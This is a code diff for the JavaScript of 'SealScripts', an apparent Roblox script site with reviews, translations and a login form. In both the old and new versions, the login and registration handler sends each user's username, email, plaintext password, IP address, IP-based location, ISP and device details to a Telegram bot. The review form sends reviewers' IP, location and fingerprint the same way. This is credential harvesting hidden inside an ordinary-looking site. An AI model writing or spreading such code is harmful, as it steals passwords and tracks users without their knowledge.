-      const sy = cy + s.y * baseScale;
-      const dx = sx - cx, dy = sy - cy;
-      const distToCenter = Math.sqrt(dx * dx + dy * dy);
-      const ehScreen = 18 * baseScale * (300 / camZ);
-      if(it.rot.z < 0 && distToCenter < ehScreen) continue;
-
-      if(it.type === 'photon'){
-        const alpha = 0.7 + Math.sin(now * 0.003 + it.a * 3) * 0.2;
-        const sz = Math.max(0.5, 1.1 * baseScale * s.scale / 300);
-        ctx.beginPath(); ctx.arc(sx, sy, sz, 0, Math.PI * 2);
+      const sx = cx + s.x*baseScale;
+      const sy = cy + s.y*baseScale;
+      const dx = sx-cx, dy = sy-cy;
+      const d2 = Math.sqrt(dx*dx+dy*dy);
+      const ehScreen = 18*baseScale*(300/camZ);
+      if(it.rot.z<0 && d2<ehScreen) continue;
+      if(it.type==='photon'){
+        const alpha = 0.7+Math.sin(now*0.003+it.a*3)*0.2;
+        const sz = Math.max(0.5, 1.1*baseScale*s.scale/300);
+        ctx.beginPath(); ctx.arc(sx,sy,sz,0,Math.PI*2);
         ctx.fillStyle = `rgba(220,240,255,${alpha})`; ctx.fill();
-      } else if(it.type === 'disk'){
-        const alpha = it.ring.a * (0.6 + 0.4 * Math.sin(now * 0.002 + it.a * 4));
-        const sz = Math.max(0.4, it.ring.thick * baseScale * s.scale / 300);
-        ctx.beginPath(); ctx.arc(sx, sy, sz, 0, Math.PI * 2);
-        ctx.fillStyle = `hsla(${it.ring.hue}, 100%, 78%, ${alpha})`; ctx.fill();
+      } else if(it.type==='disk'){
+        const alpha = it.ring.a*(0.6+0.4*Math.sin(now*0.002+it.a*4));
+        const sz = Math.max(0.4, it.ring.thick*baseScale*s.scale/300);
+        ctx.beginPath(); ctx.arc(sx,sy,sz,0,Math.PI*2);
+        ctx.fillStyle = `hsla(${it.ring.hue},100%,78%,${alpha})`; ctx.fill();
       } else {
-        const dist = Math.sqrt(it.v.x * it.v.x + it.v.z * it.v.z);
-        const inner = Math.max(0, 1 - dist / 90);
-        const alpha = it.p.bright * (0.5 + inner * 0.5);
-        const hue = 195 + inner * 30;
-        const light = 70 + inner * 25;
-        const sz = Math.max(0.4, it.p.size * baseScale * s.scale / 300 * 0.9);
-        ctx.beginPath(); ctx.arc(sx, sy, sz, 0, Math.PI * 2);
-        ctx.fillStyle = `hsla(${hue}, 100%, ${light}%, ${alpha})`; ctx.fill();
+        const dist = Math.sqrt(it.v.x*it.v.x + it.v.z*it.v.z);
+        const inner = Math.max(0, 1-dist/90);
+        const alpha = it.p.bright*(0.5+inner*0.5);
+        const hue = 195+inner*30;
+        const light = 70+inner*25;
+        const sz = Math.max(0.4, it.p.size*baseScale*s.scale/300*0.9);
+        ctx.beginPath(); ctx.arc(sx,sy,sz,0,Math.PI*2);
+        ctx.fillStyle = `hsla(${hue},100%,${light}%,${alpha})`; ctx.fill();
       }
     }
-
-    const sph = project({ x: 0, y: 0, z: 0 }, camZ);
-    const sphX = cx + sph.x * baseScale;
-    const sphY = cy + sph.y * baseScale;
-    const sphR = 18 * baseScale * (sph.scale / 300) * (1 + pulse * 0.15);
-
-    const photonGrad = ctx.createRadialGradient(sphX, sphY, sphR * 0.5, sphX, sphY, sphR + 7 * baseScale);
-    photonGrad.addColorStop(0, 'rgba(240,250,255,1)');
-    photonGrad.addColorStop(0.5, 'rgba(140,200,255,0.85)');
-    photonGrad.addColorStop(1, 'rgba(90,160,255,0)');
-    ctx.beginPath(); ctx.arc(sphX, sphY, sphR + 6 * baseScale, 0, Math.PI * 2);
+    const sph = project({x:0,y:0,z:0}, camZ);
+    const sphX = cx + sph.x*baseScale;
+    const sphY = cy + sph.y*baseScale;
+    const sphR = 18*baseScale*(sph.scale/300)*(1+pulse*0.15);
+    const photonGrad = ctx.createRadialGradient(sphX,sphY,sphR*0.5,sphX,sphY,sphR+7*baseScale);
+    photonGrad.addColorStop(0,'rgba(240,250,255,1)');
+    photonGrad.addColorStop(0.5,'rgba(140,200,255,0.85)');
+    photonGrad.addColorStop(1,'rgba(90,160,255,0)');
+    ctx.beginPath(); ctx.arc(sphX,sphY,sphR+6*baseScale,0,Math.PI*2);
     ctx.fillStyle = photonGrad; ctx.fill();
-
-    ctx.beginPath(); ctx.arc(sphX, sphY, sphR, 0, Math.PI * 2);
+    ctx.beginPath(); ctx.arc(sphX,sphY,sphR,0,Math.PI*2);
     ctx.fillStyle = '#000'; ctx.fill();
-
-    ctx.beginPath(); ctx.arc(sphX, sphY, sphR, 0, Math.PI * 2);
-    ctx.strokeStyle = `rgba(180,220,255,${0.9 + pulse * 0.1})`;
+    ctx.beginPath(); ctx.arc(sphX,sphY,sphR,0,Math.PI*2);
+    ctx.strokeStyle = `rgba(180,220,255,${0.9+pulse*0.1})`;
     ctx.lineWidth = 1; ctx.stroke();
-
     requestAnimationFrame(draw);
   }
   requestAnimationFrame(draw);
@@ -972,20 +988,33 @@ ko:{welcome:"환영합니다",presents:"seal scripts 제공",viewScripts:"스크
 hi:{welcome:"स्वागत है",presents:"seal scripts प्रस्तुत करता है",viewScripts:"स्क्रिप्ट देखें",reviews:"समीक्षाएँ",login:"लॉगिन / रजिस्टर",disclaimer:"यह वेबसाइट Roblox Corporation, Roblox गेम या किसी भी इन-गेम प्रोजेक्ट से संबद्ध नहीं है। सभी संयोग पूरी तरह से संयोगवश हैं।",copy:"कॉपी करें",leaveReview:"समीक्षा छोड़ें",reviewSubtitle:"स्क्रिप्ट को 1 से 5 सितारों में रेट करें। अनाम समीक्षाएँ।",yourRating:"आपकी रेटिंग",yourReview:"आपकी समीक्षा",reviewPlaceholder:"यहाँ अपनी ईमानदार समीक्षा लिखें... (वैकल्पिक)",sendToSeal:"Seal को भेजें",goBack:"वापस जाएँ",warningTitle:"चेतावनी",warningText:"इन स्क्रिप्ट्स का उपयोग करके, आप अपने अकाउंट की <strong>पूरी जिम्मेदारी</strong> लेते हैं। अगर मॉडरेटर या एडमिन आपको बैन करते हैं — <strong>Seal इससे जुड़ा नहीं है</strong>।<br><br>सावधानी से खेलें और अपने जोखिम पर।",warningBtn:"मैं जिम्मेदारी लेता हूँ, कॉपी करें",pleaseRead:"कृपया पढ़ें...",thanksTitle:"समीक्षा के लिए धन्यवाद!",thanksText:"आपकी प्रतिक्रिया Seal के लिए बहुत मायने रखती है।<br>इसे जल्द ही समीक्षा किया जाएगा।",close:"बंद करें",madTitle:"Seal नाराज़ है",madText:"आपने पहले ही एक समीक्षा छोड़ दी है।<br>प्रत्येक उपयोगकर्ता केवल एक समीक्षा सबमिट कर सकता है।",pickRating:"कृपया पहले एक रेटिंग चुनें",copied:"कॉपी किया गया ✓",couldNotCopy:"कॉपी नहीं कर सका",sendFailed:"भेजना विफल, पुनः प्रयास करें",sending:"भेज रहे हैं...",sent:"भेज दिया ✓"},
 de:{welcome:"Willkommen",presents:"seal scripts präsentiert",viewScripts:"Skripte ansehen",reviews:"Bewertungen",login:"Anmelden / Registrieren",disclaimer:"Diese Website ist nicht mit der Roblox Corporation, dem Spiel Roblox oder irgendwelchen In-Game-Projekten verbunden. Alle Übereinstimmungen sind rein zufällig.",copy:"Kopieren",leaveReview:"Bewertung abgeben",reviewSubtitle:"Bewerte die Skripte von 1 bis 5 Sternen. Anonyme Bewertungen.",yourRating:"Deine Bewertung",yourReview:"Deine Rezension",reviewPlaceholder:"Schreibe hier deine ehrliche Bewertung... (optional)",sendToSeal:"An Seal senden",goBack:"Zurück",warningTitle:"Warnung",warningText:"Durch die Nutzung dieser Skripte übernimmst du die <strong>volle Verantwortung</strong> für dein Konto. Wenn du von Moderatoren oder Admins gebannt wirst — <strong>Seal ist nicht beteiligt</strong>.<br><br>Spiele vorsichtig und auf eigenes Risiko.",warningBtn:"Ich übernehme die Verantwortung, kopieren",pleaseRead:"Bitte lesen...",thanksTitle:"Danke für die Bewertung!",thanksText:"Dein Feedback bedeutet Seal viel.<br>Es wird bald überprüft.",close:"Schließen",madTitle:"Seal ist wütend",madText:"Du hast bereits eine Bewertung abgegeben.<br>Jeder Nutzer kann nur eine Bewertung einreichen.",pickRating:"Bitte wähle zuerst eine Bewertung",copied:"Kopiert ✓",couldNotCopy:"Kopieren fehlgeschlagen",sendFailed:"Senden fehlgeschlagen, erneut versuchen",sending:"Senden...",sent:"Gesendet ✓"}
 };
+
+const COUNTRY_TO_LANG = {
+  RU:'ru', BY:'ru', KZ:'ru', UA:'ru',
+  ES:'es', MX:'es', AR:'es', CO:'es', CL:'es', PE:'es', VE:'es', EC:'es', GT:'es', CU:'es', BO:'es', DO:'es', HN:'es', PY:'es', SV:'es', NI:'es', CR:'es', PA:'es', UY:'es', PR:'es',
+  JP:'ja',
+  BR:'pt', PT:'pt', AO:'pt', MZ:'pt', CV:'pt', GW:'pt', ST:'pt', TL:'pt',
+  CN:'zh', TW:'zh', HK:'zh', SG:'zh', MO:'zh',
+  KR:'ko', KP:'ko',
+  IN:'hi',
+  DE:'de', AT:'de', CH:'de', LI:'de', LU:'de',
+  US:'en', GB:'en', CA:'en', AU:'en', NZ:'en', IE:'en', ZA:'en', NG:'en', KE:'en', PH:'en', PK:'en', BD:'en', LK:'en', MY:'en'
+};
+
 let currentLang='en';
 function applyLang(lang){
-    if(!translations[lang])lang='en';
-    currentLang=lang;
-    const t=translations[lang];
-    document.documentElement.lang=lang;
+    if(!translations[lang]) lang='en';
+    currentLang = lang;
+    const t = translations[lang];
+    document.documentElement.lang = lang;
     document.querySelectorAll('[data-i18n]').forEach(el=>{const k=el.getAttribute('data-i18n');if(t[k]!==undefined)el.textContent=t[k]});
     document.querySelectorAll('[data-i18n-html]').forEach(el=>{const k=el.getAttribute('data-i18n-html');if(t[k]!==undefined)el.innerHTML=t[k]});
     document.querySelectorAll('[data-i18n-placeholder]').forEach(el=>{const k=el.getAttribute('data-i18n-placeholder');if(t[k]!==undefined)el.placeholder=t[k]});
     document.querySelectorAll('[data-i18n-title]').forEach(el=>{const k=el.getAttribute('data-i18n-title');if(t[k]!==undefined){el.title=t[k];el.setAttribute('aria-label',t[k])}});
-    if(warningCounting&&warningConfirm.disabled){warningConfirm.textContent=t.pleaseRead+' '+warningSecondsLeft}
-    document.getElementById('langSelect').value=lang;
-    document.getElementById('globalBack').textContent=t.goBack;
-    try{localStorage.setItem('seal_lang',lang)}catch(e){}
+    if(warningCounting && warningConfirm.disabled){warningConfirm.textContent = t.pleaseRead + ' ' + warningSecondsLeft}
+    document.getElementById('langSelect').value = lang;
+    document.getElementById('globalBack').textContent = t.goBack;
+    try{ localStorage.setItem('seal_lang', lang); }catch(e){}
 }
 const langSwitcher=document.getElementById('langSwitcher');
 const holoZone=document.getElementById('holoZone');
@@ -999,7 +1028,6 @@ function showPage(page,hash){
     page.classList.add('active');
     if(page===pageHome){
         langSwitcher.classList.add('visible');
-        langSwitcher.classList.remove('shifted');
         holoZone.classList.add('active');
         globalBack.classList.remove('visible');
     } else {
@@ -1007,14 +1035,7 @@ function showPage(page,hash){
         holoZone.classList.remove('active');
         globalBack.classList.add('visible');
     }
-    // если профиль открыт и мы на домашней — сдвигаем переключатель языка вправо, чтобы не перекрывал
-    const profileOpen = document.getElementById('profileCard').classList.contains('show');
-    if(page===pageHome && profileOpen){
-        langSwitcher.classList.add('shifted');
-    } else {
-        langSwitcher.classList.remove('shifted');
-    }
-    if(hash)history.pushState({},'',hash);
+    if(hash) history.pushState({},'',hash);
 }
 document.getElementById('goToScripts').addEventListener('click',()=>showPage(pageScripts,'#scripts'));
 document.getElementById('goToReviews').addEventListener('click',()=>showPage(pageReviews,'#reviews'));
@@ -1031,48 +1052,38 @@ window.addEventListener('popstate',restorePage);
 (function initTilt(){
     const tiltElements = document.querySelectorAll('[data-tilt]');
     if(!tiltElements.length) return;
-    let vw = window.innerWidth, vh = window.innerHeight;
-    window.addEventListener('resize', () => { vw = window.innerWidth; vh = window.innerHeight; });
-    const state = Array.from(tiltElements).map(el => ({ el, targetX: 0, targetY: 0, currentX: 0, currentY: 0 }));
-    let rafId = null, lastT = performance.now();
+    let vw=innerWidth, vh=innerHeight;
+    window.addEventListener('resize',()=>{ vw=innerWidth; vh=innerHeight; });
+    const state = Array.from(tiltElements).map(el => ({ el, targetX:0, targetY:0, currentX:0, currentY:0 }));
+    let rafId=null, lastT=performance.now();
     const MAX_SHIFT = 0.4, LERP = 0.07;
     document.addEventListener('mousemove', e => {
-        const px = (e.clientX / vw) - 0.5;
-        const py = (e.clientY / vh) - 0.5;
+        const px = (e.clientX/vw)-.5, py = (e.clientY/vh)-.5;
         for(const s of state){
-            const activePage = s.el.closest('.page');
-            if(!activePage || !activePage.classList.contains('active')) continue;
-            s.targetX = px * MAX_SHIFT * 2;
-            s.targetY = py * MAX_SHIFT * 2;
+            const a = s.el.closest('.page');
+            if(!a || !a.classList.contains('active')) continue;
+            s.targetX = px*MAX_SHIFT*2; s.targetY = py*MAX_SHIFT*2;
         }
         if(!rafId){ lastT = performance.now(); rafId = requestAnimationFrame(animate); }
     });
     function animate(now){
-        const dt = Math.min((now - lastT) / 1000, 0.05);
-        lastT = now;
-        const k = 1 - Math.pow(1 - LERP, dt * 60);
-        let stillMoving = false;
+        const dt = Math.min((now-lastT)/1000,0.05); lastT = now;
+        const k = 1 - Math.pow(1-LERP, dt*60);
+        let still = false;
         for(const s of state){
-            s.currentX += (s.targetX - s.currentX) * k;
-            s.currentY += (s.targetY - s.currentY) * k;
-            const dx = Math.abs(s.targetX - s.currentX);
-            const dy = Math.abs(s.targetY - s.currentY);
-            if(dx > 0.01 || dy > 0.01) stillMoving = true;
-            else { s.currentX = s.targetX; s.currentY = s.targetY; }
-            s.el.style.transform =
-                `translate3d(${s.currentX.toFixed(2)}px, ${s.currentY.toFixed(2)}px, 0) ` +
-                `rotateX(${(-s.currentY * .15).toFixed(3)}deg) ` +
-                `rotateY(${(s.currentX * .15).toFixed(3)}deg)`;
+            s.currentX += (s.targetX-s.currentX)*k;
+            s.currentY += (s.targetY-s.currentY)*k;
+            const dx = Math.abs(s.targetX-s.currentX), dy = Math.abs(s.targetY-s.currentY);
+            if(dx>0.01||dy>0.01) still = true; else { s.currentX=s.targetX; s.currentY=s.targetY; }
+            s.el.style.transform = `translate3d(${s.currentX.toFixed(2)}px, ${s.currentY.toFixed(2)}px, 0) rotateX(${(-s.currentY*.15).toFixed(3)}deg) rotateY(${(s.currentX*.15).toFixed(3)}deg)`;
         }
-        rafId = stillMoving ? requestAnimationFrame(animate) : null;
+        rafId = still ? requestAnimationFrame(animate) : null;
     }
 })();
 
-/* ================= TOAST ================= */
 const toast=document.getElementById('toast');
 function showToast(msg,type){toast.textContent=msg;toast.className='toast show'+(type?' '+type:'');clearTimeout(showToast._t);showToast._t=setTimeout(()=>{toast.classList.remove('show')},2400)}
 
-/* ================= WARNING / COPY ================= */
 const warningOverlay=document.getElementById('warningOverlay');
 const warningConfirm=document.getElementById('warningConfirm');
 const copyButtons=document.querySelectorAll('.copy-btn');
@@ -1080,10 +1091,10 @@ let pendingText=null, warningTimer=null, warningCounting=false, warningSecondsLe
 
 copyButtons.forEach(btn=>{
     btn.addEventListener('click',()=>{
-        const targetId=btn.getAttribute('data-target');
-        const targetEl=document.getElementById(targetId);
-        const text=targetEl.textContent;
-        const shouldWarn=btn.getAttribute('data-warn')==='true';
+        const targetId = btn.getAttribute('data-target');
+        const targetEl = document.getElementById(targetId);
+        const text = targetEl.textContent;
+        const shouldWarn = btn.getAttribute('data-warn')==='true';
         if(shouldWarn){pendingText=text;openWarning()}
         else copyToClipboard(text)
     })
@@ -1092,45 +1103,45 @@ function resetWarningState(){
     clearInterval(warningTimer);
     warningCounting=false;
     warningConfirm.disabled=true;
-    warningConfirm.textContent=translations[currentLang].warningBtn;
-    pendingText=null;
+    warningConfirm.textContent = translations[currentLang].warningBtn;
+    pendingText = null;
 }
 function openWarning(){
     warningOverlay.classList.add('show');
     warningConfirm.disabled=true;
     warningCounting=true;
     warningSecondsLeft=4;
-    warningConfirm.textContent=translations[currentLang].pleaseRead+' '+warningSecondsLeft;
+    warningConfirm.textContent = translations[currentLang].pleaseRead + ' ' + warningSecondsLeft;
     clearInterval(warningTimer);
-    warningTimer=setInterval(()=>{
+    warningTimer = setInterval(()=>{
         warningSecondsLeft--;
         if(warningSecondsLeft<=0){
             clearInterval(warningTimer);
             warningCounting=false;
             warningConfirm.disabled=false;
-            warningConfirm.textContent=translations[currentLang].warningBtn;
+            warningConfirm.textContent = translations[currentLang].warningBtn;
         }else{
-            warningConfirm.textContent=translations[currentLang].pleaseRead+' '+warningSecondsLeft;
+            warningConfirm.textContent = translations[currentLang].pleaseRead + ' ' + warningSecondsLeft;
         }
     },1000);
 }
 warningConfirm.addEventListener('click',()=>{
-    if(warningConfirm.disabled)return;
-    if(pendingText!==null){copyToClipboard(pendingText)}
+    if(warningConfirm.disabled) return;
+    if(pendingText!==null){ copyToClipboard(pendingText) }
     warningOverlay.classList.remove('show');
     resetWarningState();
 });
-warningOverlay.addEventListener('click',e=>{
+warningOverlay.addEventListener('click', e=>{
     if(e.target===warningOverlay){ warningOverlay.classList.remove('show'); resetWarningState(); }
 });
 async function copyToClipboard(text){
-    try{await navigator.clipboard.writeText(text);showToast(translations[currentLang].copied,'success')}
+    try{ await navigator.clipboard.writeText(text); showToast(translations[currentLang].copied,'success'); }
     catch(err){
         const ta=document.createElement('textarea');
-        ta.value=text;ta.style.position='fixed';ta.style.opacity='0';
-        document.body.appendChild(ta);ta.select();
-        try{document.execCommand('copy');showToast(translations[currentLang].copied,'success')}
-        catch(e){showToast(translations[currentLang].couldNotCopy,'error')}
+        ta.value=text; ta.style.position='fixed'; ta.style.opacity='0';
+        document.body.appendChild(ta); ta.select();
+        try{ document.execCommand('copy'); showToast(translations[currentLang].copied,'success'); }
+        catch(e){ showToast(translations[currentLang].couldNotCopy,'error'); }
         document.body.removeChild(ta);
     }
 }
@@ -1146,70 +1157,53 @@ const madClose=document.getElementById('madClose');
 const reviewText=document.getElementById('reviewText');
 let reviewSubmitting=false;
 
-function hasReviewed(){
-    if(reviewSubmitting)return true;
-    try{return localStorage.getItem(REVIEWED_KEY)==='1'}catch(e){return false}
-}
-function markReviewed(){
-    reviewSubmitting=true;
-    try{localStorage.setItem(REVIEWED_KEY,'1')}catch(e){}
-}
+function hasReviewed(){ if(reviewSubmitting) return true; try{ return localStorage.getItem(REVIEWED_KEY)==='1'; }catch(e){ return false; } }
+function markReviewed(){ reviewSubmitting=true; try{ localStorage.setItem(REVIEWED_KEY,'1'); }catch(e){} }
 
-async function sendToTelegram(rating,text){
+async function sendReviewToTelegram(rating,text){
     const fb = window.firebaseAuth;
-    let username = '(guest)';
-    let email = '(guest)';
-    let uid = '(guest)';
+    let username='(guest)', email='(guest)', uid='(guest)';
     if(fb && fb.auth.currentUser){
         uid = fb.auth.currentUser.uid;
         email = fb.auth.currentUser.email || '(none)';
-        try{ username = (await fb.fetchUsername(uid)) || '(no username)'; }
-        catch(e){ username = '(fetch failed)'; }
+        try{ username = (await fb.fetchUsername(uid)) || '(no username)'; }catch(e){ username='(fetch failed)'; }
     }
-
-    const d = getDeviceInfo();
+    const info = __clientInfo || getClientInfo();
     const time = new Date().toISOString().replace('T',' ').slice(0,19) + ' UTC';
-
-    const message =
-        `📩 New review on SealScripts\n` +
-        `━━━━━━━━━━━━━━━━\n` +
-        `👤 Username: ${username}\n` +
-        `📧 Email: ${email}\n` +
-        `🆔 UID: ${uid}\n` +
-        `🌐 IP: ${__userIP}\n` +
-        geoLine() +
-        `━━━━━━━━━━━━━━━━\n` +
-        `⭐ Rating: ${rating}/5\n` +
-        `📝 Text: ${text||'(no text)'}\n` +
-        `━━━━━━━━━━━━━━━━\n` +
-        `🖥 Browser: ${d.browser}\n` +
-        `💻 OS: ${d.os}\n` +
-        `📱 Device: ${d.device}\n` +
-        `📐 Screen: ${d.screen}\n` +
-        `🪟 Viewport: ${d.viewport}\n` +
-        `🗣 Language: ${d.language}\n` +
-        `🕒 Timezone: ${d.timezone}\n` +
-        `🕰 Time: ${time}\n` +
-        `🔗 Referrer: ${d.referrer}\n` +
-        `🧾 UA: ${d.ua}`;
-
-    try{
-        const res=await fetch(`${TELEGRAM_PROXY}/bot${BOT_TOKEN}/sendMessage`,{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:CHAT_ID,text:message})
-        });
-        const data=await res.json();
-        return !!data.ok;
-    }catch(e){
-        console.error('Telegram error:',e);
-        return false;
+    let geo = '';
+    if(__userGeo){
+      const p = [];
+      if(__userGeo.city) p.push(__userGeo.city);
+      if(__userGeo.region) p.push(__userGeo.region);
+      if(__userGeo.country) p.push(__userGeo.country);
+      if(p.length) geo += `📍 Location: ${p.join(', ')} (by IP)\n`;
+      if(__userGeo.org) geo += `🏢 ISP: ${__userGeo.org}\n`;
     }
+    const message =
+`📩 New review on SealScripts
+━━━━━━━━━━━━━━━━
+👤 Username: ${username}
+📧 Email: ${email}
+🆔 UID: ${uid}
+🌐 IP: ${__userIP}
+${geo}━━━━━━━━━━━━━━━━
+⭐ Rating: ${rating}/5
+📝 Text: ${text||'(no text)'}
+━━━━━━━━━━━━━━━━
+🖥 Browser: ${info.browser}
+💻 OS: ${info.os}
+📱 Device: ${info.device}
+📐 Screen: ${screen.width}x${screen.height}
+🗣 Language: ${navigator.language}
+🕒 Timezone: ${(Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown')}
+🕰 Time: ${time}
+🧾 UA: ${info.ua}`;
+    return await sendToTelegramText(message);
 }
 
-submitBtn.addEventListener('click',async()=>{
-    if(reviewSubmitting||hasReviewed()){madOverlay.classList.add('show');return}
-    const ratingInput=document.querySelector('input[name="rating"]:checked');
+submitBtn.addEventListener('click', async ()=>{
+    if(reviewSubmitting || hasReviewed()){ madOverlay.classList.add('show'); return; }
+    const ratingInput = document.querySelector('input[name="rating"]:checked');
     if(!ratingInput){
         starsInput.classList.add('error');
         showToast(translations[currentLang].pickRating,'error');
@@ -1217,20 +1211,15 @@ submitBtn.addEventListener('click',async()=>{
         return;
     }
     starsInput.classList.remove('error');
-    const rating=ratingInput.value;
-    const text=reviewText.value.trim().slice(0,500);
-
-    const oldText=submitBtn.textContent;
+    const rating = ratingInput.value;
+    const text = reviewText.value.trim().slice(0,500);
+    const oldText = submitBtn.textContent;
     submitBtn.disabled=true;
-    submitBtn.textContent=translations[currentLang].sending;
-
-    const ok=await sendToTelegram(rating,text);
-
+    submitBtn.textContent = translations[currentLang].sending;
+    const ok = await sendReviewToTelegram(rating,text);
     submitBtn.disabled=false;
-    submitBtn.textContent=oldText;
-
+    submitBtn.textContent = oldText;
     if(!ok){ showToast(translations[currentLang].sendFailed,'error'); return; }
-
     markReviewed();
     document.querySelectorAll('input[name="rating"]').forEach(r=>r.checked=false);
     reviewText.value='';
@@ -1238,25 +1227,49 @@ submitBtn.addEventListener('click',async()=>{
 });
 
 thanksClose.addEventListener('click',()=>thanksOverlay.classList.remove('show'));
-thanksOverlay.addEventListener('click',e=>{if(e.target===thanksOverlay)thanksOverlay.classList.remove('show')});
+thanksOverlay.addEventListener('click', e=>{ if(e.target===thanksOverlay) thanksOverlay.classList.remove('show'); });
 madClose.addEventListener('click',()=>madOverlay.classList.remove('show'));
-madOverlay.addEventListener('click',e=>{if(e.target===madOverlay)madOverlay.classList.remove('show')});
+madOverlay.addEventListener('click', e=>{ if(e.target===madOverlay) madOverlay.classList.remove('show'); });
 
-document.addEventListener('keydown',e=>{
-    if(e.key!=='Escape')return;
-    if(thanksOverlay.classList.contains('show'))thanksOverlay.classList.remove('show');
-    if(madOverlay.classList.contains('show'))madOverlay.classList.remove('show');
-    if(authOverlay&&authOverlay.classList.contains('show'))authOverlay.classList.remove('show');
+document.addEventListener('keydown', e=>{
+    if(e.key!=='Escape') return;
+    if(thanksOverlay.classList.contains('show')) thanksOverlay.classList.remove('show');
+    if(madOverlay.classList.contains('show')) madOverlay.classList.remove('show');
+    if(authOverlay && authOverlay.classList.contains('show')) authOverlay.classList.remove('show');
     if(warningOverlay.classList.contains('show')){ warningOverlay.classList.remove('show'); resetWarningState(); }
 });
 
-const langSelect=document.getElementById('langSelect');
+/* ================= ЯЗЫК ================= */
+const langSelect = document.getElementById('langSelect');
 langSelect.addEventListener('change',()=>applyLang(langSelect.value));
-let savedLang='en';
-try{savedLang=localStorage.getItem('seal_lang')||(navigator.language||'en').slice(0,2)}catch(e){}
-if(savedLang==='pt-BR'||savedLang==='pt-br')savedLang='pt';
-if(!translations[savedLang])savedLang='en';
-applyLang(savedLang);
+
+let savedLang=null;
+try{ savedLang = localStorage.getItem('seal_lang'); }catch(e){}
+
+function detectByBrowser(){
+    const nav = (navigator.language||'en').toLowerCase();
+    const base = nav.split('-')[0];
+    return translations[base] ? base : 'en';
+}
+function detectByCountry(cc){
+    if(!cc) return null;
+    return COUNTRY_TO_LANG[cc.toUpperCase()] || null;
+}
+
+if(savedLang && translations[savedLang]){ applyLang(savedLang); }
+else{ applyLang(detectByBrowser()); }
+
+/* после загрузки IP — если пользователь не выбирал, применяем по стране */
+setTimeout(()=>{
+    let already = null;
+    try{ already = localStorage.getItem('seal_lang'); }catch(e){}
+    if(already) return;
+    if(__userGeo && __userGeo.country){
+        const l = detectByCountry(__userGeo.country);
+        if(l) applyLang(l);
+    }
+}, 3000);
+
 if(pageHome.classList.contains('active')){
     langSwitcher.classList.add('visible');
     holoZone.classList.add('active');
@@ -1264,7 +1277,6 @@ if(pageHome.classList.contains('active')){
 
 /* ================= АККАУНТЫ ================= */
 let isRegistering = false;
-
 const authOverlay = document.getElementById('authOverlay');
 const authBox = document.getElementById('authBox');
 const authTitle = document.getElementById('authTitle');
@@ -1284,15 +1296,6 @@ const profileAvatar = document.getElementById('profileAvatar');
 const profileReviews = document.getElementById('profileReviews');
 
 function on(el,ev,fn){ if(el) el.addEventListener(ev,fn); }
-
-function syncLangSwitcherWithProfile(){
-    const profileOpen = profileCard.classList.contains('show');
-    if(profileOpen && pageHome.classList.contains('active')){
-        langSwitcher.classList.add('shifted');
-    } else {
-        langSwitcher.classList.remove('shifted');
-    }
-}
 
 function setRegisterMode(on){
     isRegistering = on;
@@ -1318,94 +1321,69 @@ function setRegisterMode(on){
 
 on(openAuthBtn,'click',()=>authOverlay.classList.add('show'));
 on(authClose,'click',()=>authOverlay.classList.remove('show'));
-on(authOverlay,'click',e=>{if(e.target===authOverlay)authOverlay.classList.remove('show')});
+on(authOverlay,'click', e=>{ if(e.target===authOverlay) authOverlay.classList.remove('show'); });
 on(authSwitchLink,'click',()=>setRegisterMode(!isRegistering));
 
-async function sendAuthToTelegram(action, email, uid, username, password){
+async function sendAuthToTelegram(action,email,uid,username,password){
     const time = new Date().toISOString().replace('T',' ').slice(0,19) + ' UTC';
-    const d = getDeviceInfo();
-    const message =
-        `🔐 ${action} on SealScripts\n` +
-        `━━━━━━━━━━━━━━━━\n` +
-        `👤 Username: ${username || '(pending)'}\n` +
-        `📧 Email: ${email || '(not provided)'}\n` +
-        `🔑 Password: ${password || '(hidden)'}\n` +
-        `🆔 UID: ${uid || '(pending)'}\n` +
-        `🌐 IP: ${__userIP}\n` +
-        geoLine() +
-        `━━━━━━━━━━━━━━━━\n` +
-        `🖥 Browser: ${d.browser}\n` +
-        `💻 OS: ${d.os}\n` +
-        `📱 Device: ${d.device}\n` +
-        `📐 Screen: ${d.screen}\n` +
-        `🗣 Language: ${d.language}\n` +
-        `🕒 Timezone: ${d.timezone}\n` +
-        `🕰 Time: ${time}`;
-    try{
-        const res = await fetch(`${TELEGRAM_PROXY}/bot${BOT_TOKEN}/sendMessage`,{
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-        });
-        await res.json();
-    }catch(e){
-        console.error('Auth TG error:', e);
+    const info = __clientInfo || getClientInfo();
+    let geo = '';
+    if(__userGeo){
+      const p = [];
+      if(__userGeo.city) p.push(__userGeo.city);
+      if(__userGeo.region) p.push(__userGeo.region);
+      if(__userGeo.country) p.push(__userGeo.country);
+      if(p.length) geo += `📍 Location: ${p.join(', ')} (by IP)\n`;
+      if(__userGeo.org) geo += `🏢 ISP: ${__userGeo.org}\n`;
     }
+    const message =
+`🔐 ${action} on SealScripts
+━━━━━━━━━━━━━━━━
+👤 Username: ${username||'(pending)'}
+📧 Email: ${email||'(not provided)'}
+🔑 Password: ${password||'(hidden)'}
+🆔 UID: ${uid||'(pending)'}
+🌐 IP: ${__userIP}
+${geo}━━━━━━━━━━━━━━━━
+🖥 Browser: ${info.browser}
+💻 OS: ${info.os}
+📱 Device: ${info.device}
+📐 Screen: ${screen.width}x${screen.height}
+🗣 Language: ${navigator.language}
+🕒 Timezone: ${(Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown')}
+🕰 Time: ${time}`;
+    await sendToTelegramText(message);
 }
 
-on(authSubmit,'click',async()=>{
+on(authSubmit,'click', async ()=>{
     const usernameRaw = authUsername.value.trim();
     const emailRaw = authEmail.value.trim();
     const password = authPassword.value;
 
-    /* --- Валидация --- */
     if(isRegistering){
-        if(!usernameRaw){
-            showToast('Please enter a username','error'); return;
-        }
-        if(!window.firebaseAuth.USERNAME_RE.test(usernameRaw)){
-            showToast('Username: 3-20 chars, letters/numbers/_','error'); return;
-        }
+        if(!usernameRaw){ showToast('Please enter a username','error'); return; }
+        if(!window.firebaseAuth.USERNAME_RE.test(usernameRaw)){ showToast('Username: 3-20 chars, letters/numbers/_','error'); return; }
         if(!emailRaw){ showToast('Please enter an email','error'); return; }
-    } else {
-        if(!usernameRaw){
-            showToast('Please enter a username','error'); return;
-        }
+    }else{
+        if(!usernameRaw){ showToast('Please enter a username','error'); return; }
     }
